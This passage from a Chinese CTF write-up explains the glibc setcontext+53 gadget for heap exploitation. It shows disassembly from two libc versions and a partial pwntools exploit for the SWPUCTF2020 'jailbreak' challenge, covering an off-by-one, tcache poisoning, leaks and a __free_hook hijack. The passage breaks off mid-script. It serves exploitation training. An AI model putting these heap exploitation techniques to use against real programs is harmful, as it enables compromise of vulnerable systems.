但不足以完成我们的目标时，可以先跳 <code>setcontext+53</code> 来扩大控制范围。简单来说就是<strong>通过 setcontext 控制寄存器的值</strong>。</p><h3 id="setcontext-53-避免-crash"><a href="#setcontext-53-避免-crash" class="headerlink" title="setcontext+53 避免 crash"></a>setcontext+53 避免 crash</h3><p><strong>libc 2.27 下完整 setcontext 如下：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext&gt;:     push   rdi</span><br><span class="line">&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]</span><br><span class="line">&lt;setcontext+8&gt;:   xor    edx,edx</span><br><span class="line">&lt;setcontext+10&gt;:  mov    edi,0x2</span><br><span class="line">&lt;setcontext+15&gt;:  mov    r10d,0x8</span><br><span class="line">&lt;setcontext+21&gt;:  mov    eax,0xe</span><br><span class="line">&lt;setcontext+26&gt;:  syscall </span><br><span class="line">&lt;setcontext+28&gt;:  pop    rdi</span><br><span class="line">&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001</span><br><span class="line">&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;</span><br><span class="line">&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]</span><br><span class="line">&lt;setcontext+44&gt;:  fldenv [rcx]</span><br><span class="line">&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]</span><br><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret    </span><br><span class="line">&lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78</span><br><span class="line">&lt;setcontext+135&gt;: neg    eax</span><br><span class="line">&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff</span><br><span class="line">&lt;setcontext+144&gt;: ret</span><br></pre></td></tr></table></figure><p><code>fldenv [rcx]</code>指令会造成程序执行的时候直接crash，所以要避开这个指令，跳转到 setcontext+53 。</p><h3 id="部署堆栈空间控制对应寄存器"><a href="#部署堆栈空间控制对应寄存器" class="headerlink" title="部署堆栈空间控制对应寄存器"></a>部署堆栈空间控制对应寄存器</h3><p>沙盒堆溢出题目利用是将 <code>__free_hook</code> 劫持为 <code>setcontext+53</code> ，当 free 堆块时堆地址作为参数放在 rdi 传入函数中，进入到 setcontext 就会以<strong>堆地址</strong>作为基址，将不同偏移地址上的数据放入寄存器。所以我们需要控制<strong>堆地址</strong>后面空间上的内容。</p><blockquote><p>注意：这里提前布置的数据并不是 srop 中的 frame！！！在其他题目的 wp 中使用 SigreturnFrame() 是方便生成而已，并不是说明填进去的是 frame。比如：</p><p><code>frame.rdi=0x123456</code> 最后 0x123456 是赋值到 rsi &lt;- <code>mov    rsi,QWORD PTR [rdi+0x70]</code></p><p>frame.rdi 的 0x123456 被传入 rsi </p></blockquote><p>构造 rsp 时需要注意 push rcx 的影响，如果 rsp 地址不可访问，程序就会 crash 。</p><h3 id="libc-2-29-之后变化"><a href="#libc-2-29-之后变化" class="headerlink" title="libc 2.29 之后变化"></a>libc 2.29 之后变化</h3><p><strong>libc 2.27 下 setcontext：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:      mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:      mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:      mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:      mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:      mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:      mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:      mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:      mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:      push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:      mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:      mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;:     mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;:     mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;:     mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;:     mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;:     xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;:     ret</span><br><span class="line">&lt;setcontext+128&gt;:     mov    rcx,QWORD PTR [rip+0x398c61]</span><br><span class="line">&lt;setcontext+135&gt;:     neg    eax</span><br><span class="line">&lt;setcontext+137&gt;:     mov    DWORD PTR fs:[rcx],eax</span><br><span class="line">&lt;setcontext+140&gt;:     or     rax,0xffffffffffffffff</span><br><span class="line">&lt;setcontext+144&gt;:     ret</span><br></pre></td></tr></table></figure><p><strong>libc 2.30 下 setcontext：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+52&gt;:      fldenv [rcx]</span><br><span class="line">&lt;setcontext+54&gt;:      ldmxcsr DWORD PTR [rdx+0x1c0]</span><br><span class="line">&lt;setcontext+61&gt;:      mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">&lt;setcontext+68&gt;:      mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">&lt;setcontext+75&gt;:      mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">&lt;setcontext+79&gt;:      mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">&lt;setcontext+83&gt;:      mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">&lt;setcontext+87&gt;:      mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">&lt;setcontext+91&gt;:      mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">&lt;setcontext+95&gt;:      test   DWORD PTR fs:0x48,0x2</span><br><span class="line">&lt;setcontext+107&gt;:     je     0x7f4ea94d71c6 &lt;setcontext+294&gt;</span><br><span class="line">&lt;setcontext+113&gt;:     mov    rsi,QWORD PTR [rdx+0x3a8]</span><br><span class="line">&lt;setcontext+120&gt;:     mov    rdi,rsi</span><br><span class="line">&lt;setcontext+123&gt;:     mov    rcx,QWORD PTR [rdx+0x3b0]</span><br><span class="line">&lt;setcontext+130&gt;:     cmp    rcx,QWORD PTR fs:0x78</span><br><span class="line">&lt;setcontext+139&gt;:     je     0x7f4ea94d7165 &lt;setcontext+197&gt;</span><br><span class="line">&lt;setcontext+141&gt;:     mov    rax,QWORD PTR [rsi-0x8]</span><br><span class="line">&lt;setcontext+145&gt;:     and    rax,0xfffffffffffffff8</span><br><span class="line">&lt;setcontext+149&gt;:     cmp    rax,rsi</span><br><span class="line">&lt;setcontext+152&gt;:     je     0x7f4ea94d7140 &lt;setcontext+160&gt;</span><br></pre></td></tr></table></figure><p>原来是以 rdi 作为基地址，在 libc 2.29 之后以 rdx 作为基地址。</p><h2 id="SWPUCTF2020-jailbreak"><a href="#SWPUCTF2020-jailbreak" class="headerlink" title="SWPUCTF2020 jailbreak"></a>SWPUCTF2020 jailbreak</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;ctf&#x2F;work&#x2F;jailbreak&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序限制操作次数，以及（正常情况下）允许分配的堆 size 总数，这个数存放在堆上：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201226011019.png" alt="image-20201226011019096"></p><p>程序初始化时调用 chroot 改变根目录：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20201226005504.png" alt="image-20201226005504441"></p><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>自定义输入函数存在 off by one ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210109134708.png" alt="image-20201226005326707"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>libc 地址怎么都是要知道的，题目限制申请总 size ，先用 tcache 泄露堆地址。offbyone 创造出 tcachebin 重叠空间，修改在 tcachebin 中的堆得 fd 指针，指向到 size 所在空间，调大 size 。</p><p>重复上面构成堆重叠步骤在 tcache struct 上申请一个堆控制索引数量，将 0x90 索引数量调成 8 。溢出修改 size 位伪造出一个 0x90 的堆释放进入 unsortedbin 泄露地址。</p><p>重复上面构造堆重叠步骤修改 tcachebin fd 指针指向 free_hook ，将 tcache bin 其中一个开头地址修改为 __free hook 用于修改其值位 setcontent+53 。同时部署 setcontext 的上下文。利用 setcontext 构建出一个 read 写入，写入 ROP 链：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行chdir(fd)来实现chroot逃逸</span><br><span class="line">ORW 读取 flag</span><br></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>本地复现时在 18.04 系统里面跑，没有 chroot 等等限制。。。将 __free_hook 改 onegadget 就 getshell 了。后面放到 docker 各种限制就又出现了。。。</p><blockquote><p>官方WP：<a href="https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/#jailbreak">https://wllm1013.github.io/2020/12/09/SWPUCTF2020-%E5%AE%98%E6%96%B9WP/#jailbreak</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>], arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./jailbreak&quot;</span>)</span><br><span class="line">lib = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./jailbreak&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> sh.send(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sa</span>(<span class="params">delim, data</span>):</span> <span class="keyword">return</span> sh.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> sh.sendline(<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span>(<span class="params">delim, data</span>):</span> <span class="keyword">return</span> sh.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">r</span>(<span class="params">numb=<span class="number">4096</span></span>):</span> <span class="keyword">return</span> sh.recv(numb)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span>(<span class="params">delims, drop=<span class="literal">True</span></span>):</span> <span class="keyword">return</span> sh.recvuntil(delims, drop)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">irt</span>():</span> <span class="keyword">return</span> sh.interactive()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu32</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uu64</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru7f</span>():</span> <span class="keyword">return</span> u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruf7</span>():</span> <span class="keyword">return</span> u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">data</span>):</span> <span class="keyword">return</span> log.success(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name_size, description_size</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Item name size:&quot;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    sla(<span class="string">&quot;Item description size:&quot;</span>, <span class="built_in">str</span>(description_size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, name, description</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;M&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify name?[y/N]&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;new name:&quot;</span>, <span class="built_in">str</span>(name))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify name?[y/N]&quot;</span>, <span class="string">&quot;n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> description != <span class="string">&quot;&quot;</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify description?[y/N]&quot;</span>, <span class="string">&quot;y&quot;</span>)</span><br><span class="line">        sa(<span class="string">&quot;new description:&quot;</span>, <span class="built_in">str</span>(description))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Modify description?[y/N]&quot;</span>, <span class="string">&quot;n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;S&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;W&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>():</span></span><br><span class="line">    sla(<span class="string">&quot;Action:&quot;</span>, <span class="string">&quot;\xFF&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Action[y/N]&quot;</span>, <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap_base</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Item name: &quot;</span>)</span><br><span class="line">heap_base = uu64(r(<span class="number">6</span>)) - <span class="number">0x280</span></span><br><span class="line">log.info(<span class="string">&quot;heap_base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack money</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x13&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\x14&#x27;</span> * <span class="number">0x18</span> + p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x29</span>)  <span class="comment"># 0x20;0x40</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;\x13&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;\x14&#x27;</span> * <span class="number">0x18</span> +</span><br><span class="line">     p64(<span class="number">0x21</span>) + p64(heap_base + <span class="number">0x250</span> + <span class="number">0x10</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)  <span class="comment"># balance tcache number</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)  <span class="comment"># 0x20;0x20</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="number">0x18</span>)  <span class="comment"># 0x20;0x20</span></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;\x15&#x27;</span> * <span class="number">0x18</span> + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xcafecafe</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get fd</span></span><br><span class="line">backdoor()</span><br><span class="line">ru(<span class="string">&quot;secret:&quot;</span>)</span><br><span class="line">dir_fd = <span class="built_in">int</span>(ru(<span class="string">&quot;\n&quot;</span>).strip(), <span class="number">10</span>)</span><br><span class="line">log.info(<span class="string">&quot;dri_fd:&quot;</span>+<span class="built_in">hex</span>(dir_fd))</span><br><span class="line"></span><br><span class="line"><span class="comment"># hijack tache struct</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)  <span class="comment"># 3</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x28</span> + p8(<span class="number">0x51</span>), <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x48</span>)  <span class="comment"># 0x30;0x50</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x28</span> + <span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x28</span> +</span><br><span class="line">     p64(<span class="number">0x31</span>) + p64(heap_base + <span class="number">0x10</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="number">0x38</span>)  <span class="comment"># tcache struct;0x40 tbin</span></span><br><span class="line"><span class="comment"># set 0x90-&gt;8</span></span><br><span class="line">edit(<span class="number">4</span>, p64(<span class="number">0x0800000000000000</span>) + <span class="string">&quot;\n&quot;</span>, p64(<span class="number">0xdeadbeef</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc_base</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="string">&#x27;\x15&#x27;</span> * <span class="number">0x38</span> + p8(<span class="number">0x91</span>), <span class="string">&#x27;\x16&#x27;</span> * <span class="number">0x18</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment"># bypass double free(!prev_inuse)</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="string">&#x27;\n&#x27;</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="number">0x38</span>)  <span class="comment"># 5</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&quot;Item idx: 5&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">main_arena = uu64(r(<span class="number">6</span>)) - <span class="number">224</span></span><br><span class="line">libc = main_arena - <span class="number">0x10</span> - lib.symbols[<span class="string">b&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line"></span><br><span class="line">lib.address = libc</span><br><span class="line">system = lib.symbols[<span class="string">b&#x27;system&#x27;</span>]</span><br><span class="line">binsh = lib.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">__free_hook = lib.symbols[<span class="string">b&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span 